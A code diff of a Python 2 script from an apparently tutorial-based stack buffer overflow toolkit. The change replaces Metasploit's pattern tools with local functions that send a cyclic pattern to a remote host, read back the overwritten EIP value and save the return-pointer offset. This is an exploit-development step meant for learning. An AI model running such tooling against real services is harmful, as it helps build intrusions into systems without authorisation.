@@ -11,7 +11,7 @@
 # Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
 # https://github.com/justinsteven/dostackbufferoverflowgood
 
-import socket, subprocess, functions
+import functions
 
 # get parameters
 RHOST = functions.getRhost()
@@ -20,19 +20,20 @@ buf_totlen = functions.getBufTotlen()
 
 print "RHOST=%s; RPORT=%s; buf_totlen=%s" % (RHOST, RPORT, buf_totlen)
 
-cmd = ["msf-pattern_create", "-l", str(buf_totlen)]
-
-# print ' '.join(cmd)
-
-print "Generating unique pattern..."
-# generate unique pattern with msf-pattern_create
-pattern = subprocess.check_output(cmd)
-
-print "Pattern:\n" + pattern.decode("utf-8")
+pattern = functions.pattern_create(buf_totlen)
+pattern += '\n'
+print pattern
 
 sent = functions.sendBuffer(RHOST, RPORT, pattern)
 
 if sent is 0:
-    print "To determine offset, execute: "
-    print "msf-pattern_offset -q <EIP value>"
-    print "Then enter offset at next step."
+    print "EIP should now be overwritten."
+    eip_value = raw_input("EIP value: ")
+    offset_srp = functions.pattern_offset(eip_value, pattern)
+    print "offset_srp =", offset_srp
+    if "offset_srp" in open("params.py", "r").read() and offset_srp != functions.getOffsetSrp():
+        print "Something went wrong...offset_srp is already defined in params.py as %s" % functions.getOffsetSrp()
+    elif isinstance(offset_srp, int):
+        functions.writeParamToFile("offset_srp", offset_srp)
+    else:
+        print "Error: offset could not be found."
